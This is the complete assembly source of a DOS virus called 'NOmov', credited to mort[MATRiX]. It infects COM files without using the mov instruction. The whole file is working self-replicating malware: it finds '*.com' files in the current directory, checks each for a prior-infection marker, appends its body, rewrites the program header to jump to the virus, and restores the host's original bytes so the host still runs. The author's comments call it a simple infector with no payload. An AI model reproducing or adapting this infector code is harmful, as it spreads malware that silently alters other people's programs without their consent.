
comment "
MOmov	- created by mort[MATRiX]
		- simple COM infector (without mov instruction)
		- no payload
		- w32 forewer,but COM rools,...
		- too many bugs,...but i cant c them
		- many things in this code could b wrote more better and
		  effectivelly, but ... 
"
;author's comment : only idiot could write this,...


nojumps

code segment word
assume cs:code
org 0100h

@loader:			
	push cs
	pop ax
	add ax,1
	push ax
	xor ax,ax
	sub ax,0ff00h
	push ax
	retf
	db 'mov'		


@start:
	clc
	cld
	call @dta		
	xchg ax,dx
	int 21h

	call @findFirst		
	int 21h

@nextF:
	call @infect		

	call @findFirst		

	jmp @nextCode


@dta:		
	push cs
	call @fillReg
	pushf
	and ax,0ffh
	xchg ah,al
	xchg ax,dx
	jmp @dtaOffs		

@attrib:
	call @fillReg
	and ax,0ffh
	xchg ax,cx
	retn

@fillReg:
	push bp
	push sp
	pop bp
	push word ptr ss:[bp + 2]
	pop ax
	pop bp
	retn

@header:
	push cs
	pop ax
	add ax,01234h
_dSeg		equ $ - 2
	push ax
	xor ax,ax
	sub ax,0ff00h
	push ax
	retf	
@hEnd	label
_hSize		equ @hEnd - @header


@openFile:
	call @fillReg
	dec ax
	dec ax
	retn

@findFirst:
	call @attrib
	call @fillReg
	call @mask
	and ax,0ffh
	xchg al,ah
	ret

@nextCode:
	inc ah		
	int 21h

	jnc @nextF

	call @dta
	sub ax,_dta - @start	
	push ax
	sub ax,080h		
	xchg ax,dx
	push es
	pop ds
	int 21h

	pop ax
	push ds		
	push ax		

	retf		
	db 13,10,'.mort[MATRiX]''s virus - NOmov,...enjoy',13,10

@infect:
	call @noCopy
	push ax			

	sub ax,-30		 
	xchg ax,dx
	call @openFile	
	sub ax,6
	xchg ah,al
	inc al
	push ax			

	add ax,05ffh		
	sub cx,7
	int 21h
	
	pop ax
	push ax

	int 21h			
	xchg ax,bx		

	pop ax
	push ax
	inc ah
	inc ah			
	xchg ax,dx
	call @noCopy
	sub ax,_dta - _oldHeader

	xchg ax,dx		
	sub cx,13h
	int 21h			

	pop ax
	push ax
	
	xchg si,dx
	cmp word ptr ds:[si],0580eh	
	jz @closeIt
			
	sub ah,-5
	push ax		
	pop di
	xor cx,cx
	xor dx,dx
	int 21h		

	cmp ax,_hSize		
	jb @closeIt

@decIt:
	push ax
	and ax,0fh
	jz @gotIt	
	pop ax
	inc ax
	jmp @decIt

@gotIt:
	pop ax		
	push ax		
	pop dx
	shr ax,4
	
	pop cx		 
	
	xchg ax,si
	pop ax
	sub ax,_dta - _dSeg
	xchg ax,si
	push ax
	pop word ptr [si]
	push cx
	
	xchg ax,di	
	xor al,al
	xor cx,cx
	int 21h
		
	pop ax		

	push ax	
	sub ah,-3	
	xchg ax,cx
	call @noCopy
	sub ax,0100h
	xchg ax,cx	
	add dx,0100h
	int 21h	
	
	pop ax		
	push ax
	sub ah,-5
	sub al,al
	xor cx,cx
	xor dx,dx
	int 21h

	pop ax
	push ax
	
	sub ah,-3	
	add cx,_hSize
	sub si,_dSeg - @header
	xchg dx,si
	int 21h
	
	pop ax
	jmp @closeIt1	

@closeIt:
	pop ax		
	pop dx

@closeIt1:
	inc ah
	push ax
	int 21h		

	pop ax

	add ax,04ffh
	xchg ax,dx
	call @noCopy
	sub ax,-21
	push ax ax
	pop si
	push word ptr ds:[si]
	pop cx
	and cx,0ffh
	pop ax
	sub ax,-9
	xchg ax,dx
	int 21h

	retn

@mask:
	xchg ax,dx
	call @fillReg
	sub ax,-5
	xchg ax,dx	
	retn
	db '*.com',0

@setOldBytes:		
	push ax
	call @fillReg
	sub ax,-18
	push ax
	pop si
	sub ax,_oldHeader - @start
	xchg ax,di
	
	db 066h
	movsw
	db 066h
	movsw
	db 066h
	movsw
	movsw
	pop ax
	retn

_oldHeader	label
	retn
	db _hSize - 1 dup(0)

@dtaOffs:
	popf
	pop ds
	jc @noCopy

	call @setOldBytes

@noCopy:
	call @fillReg
	sub ax,-4
	retn

_dta		db 42 dup(0)

code ends
end @loader
